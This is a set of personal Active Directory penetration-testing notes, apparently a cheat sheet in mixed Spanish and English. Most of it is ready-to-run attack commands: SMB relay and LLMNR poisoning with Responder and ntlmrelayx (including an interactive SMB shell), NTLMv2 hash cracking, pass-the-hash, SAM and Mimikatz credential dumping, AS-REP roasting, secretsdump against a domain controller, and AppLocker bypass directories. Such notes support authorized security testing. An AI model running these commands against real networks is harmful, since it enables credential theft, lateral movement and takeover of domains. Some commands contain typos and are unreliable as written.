Notas Active Directory Pentest

ping para la lista de los host disponibles:
# fping -a -g 10.10.10.0/23 2>/dev/null | tee alive_hosts2.txt

Ataque SMB Relay Attack

Generar una lista de hosts retransmitibles (SMB Signing disabled)

# crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
# sudo nano /etc/responder/Responder.conf

Change SMB and HTTP to “off” and save the file.

# sudo responder -I eth0 -dwv

Now run ntlmrelayx.py to relay the hash.

# $ ntlmrelayx.py -tf <folder with target IP addresses> -smb2support

Discovery y Enumeracion sin credenciales
https://github.com/lefayjey/linWinPwn


Enumeracion con credenciales.
Enumeración de Active Directory con “ldapdump.py”

https://github.com/dirkjanm/ldapdomaindump
python3 ldapdomaindump.py --user "domain\user" -p 'password' ldap://10.10.10.10:389 --no-json --no-grep -o output

Enumeration Active Directory Auto
Git clone the repository and make the script executable

git clone https://github.com/lefayjey/linWinPwn

cd linWinPwn; chmod +x linWinPwn.sh

Install requirements using the install.sh script (using standard account)

chmod +x install.sh

./install.sh

Unauthenticated

./linWinPwn.sh -t 10.10.10.100 -o local.domain.com

Authenticated

./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u testing -p servicess -M user

Authenticated Pass the hash

./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u Administrator -p :3432e23aa4bc545.... -M pwd_dump

Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts

crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz

crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikazt

crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth --shares

Enumerating Applocker Rules
Policy Applocker Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

This should show allowed directories where we can execute our own binaries

PS C:\Tools> (Get-AppLockerPolicy -Local).RuleCollections

PS C:\Tools> Get-AppLockerPolicy -Local -Effective -Xml | Set-Content ('C:\users\public\applockerpolicy.xml')

If AppLocker were configured with default rules, this directory is whitelisted by default:

C:\Windows\System32\spool\drivers\color C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys C:\Windows\Tasks C:\windows\tracing

AS-REP Roasting
Impacket-GetNPUsers.py -request -dc-ip 192.168.2.160 lab.local/blah:passw0rd -outputfile asreproast_hashes.txt

Remote Desktop with ir without NLA rdesktop -d [dt.com](http://dt.com/) -u user1 -p Pa$$w0rd 10.10.10.10 -g 100%

Referencias: https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/ https://learn.microsoft.com/es-es/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties

SMB Relay Attack: SMB Shell
A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access.

$ responder -I eth0 -dwv

Now perform the SMB Relay attack as before, but add an “i” which will create an interactive SMB shell instead of dumping the SAM hashes:

$ ntlmrelayx.py -tf <folder with target IP addresses> -smb2support -i

LLMNR Poisoning
Link-Local Multicast Name Resolution (LLMNR) is a DNS resolution protocol that does not require a DNS server. LLMNR tries to resolve a DNS request that DNS could not fulfill. LLMNR Poisoning will provide NTLMv2 hash, which can be used to crack using a hash cracker tool like Hashcat or John the Ripper. NTLMv2 hash cannot be passed around the network, as we will cover later with the ‘pass the hash’ attack.

First, you want to make sure all services are turned on with Responder. So run the command:

$ gedit /etc/responder/Responder.conf

$ responder -I eth0 -dwv

$ hashcat -m 5600 <ntlmv2 hash file> <password list> (-m 5600 is the option from Hashcat to crack NTLMv2 hashes.)

Pass the Hash Attack
$ crackmapexec smb <domain IPv4 IP address>/24 -u <SAM account name> -d <domain name>.local -H <NTLM hash>

$ crackmapexec smb <local IPv4 address>/24 -u <username> -H <NTLM hash> — local-auth

Now run ntlmrelayx.py to relay the credentials, dump domain information, and create a new domain user. ntlmrelayx.py -6 -t ldaps://<domain controller IPv4 address> -wh fakewpad.<domain name>.local -l <name folder for domain information dumping>

secretsdump.py <domain name>/<mitm6 added user>@<domain controller IPv4 address>
